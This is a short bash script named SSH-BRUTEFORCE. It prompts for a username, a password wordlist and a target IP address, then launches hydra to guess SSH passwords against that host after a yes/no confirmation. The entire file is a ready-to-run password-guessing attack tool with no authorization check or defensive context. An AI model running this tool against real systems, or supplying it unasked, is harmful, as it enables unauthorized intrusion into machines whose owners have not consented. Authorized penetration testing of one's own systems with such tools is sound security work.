#!/bin/bash

menu()
{
    banner()
    {
    clear
    printf "############################\n"
    printf "#      SSH-BRUTEFORCE      #\n"
    printf "############################\n"
    }
    
    username_loop()
    {
    banner
    read -p "SSH username: " username
    if [ -z "$username" ]; then echo "Username cannot be empty! Try again...";sleep 1.9;clear;username_loop; fi
    }
    
    wordlist_loop()
    {
    banner
    read -p "Wordlist: " wordlist
    if [ -z "$wordlist" ]; then echo "Wordlist cannot be empty! Try again...";sleep 1.9;clear;wordlist_loop; fi
    }
    
    ip_loop()
    {
    banner
    read -p "Target IP: " ip
    if [ -z "$ip" ]; then echo "Target IP cannot be empty! Try again...";sleep 1.9;clear;ip_loop; fi
    }
    
    username_loop
    wordlist_loop
    ip_loop

    start()
    {
    banner
    read -p "Start attack (Y/n)?: " question
    case $question in
        [yY]|[yY][eE][sS])
            printf "Starting attack...\n"
            sleep 1.2
            hydra -l $username -P $wordlist $ip ssh
            ;;
        [nN]|[nN][oO])
            printf "Aborting...\n"
            exit
            ;;
        *)
            printf "Wrong answer! Try again..." && sleep 2 && start
            ;;
    esac
    }
}

menu
start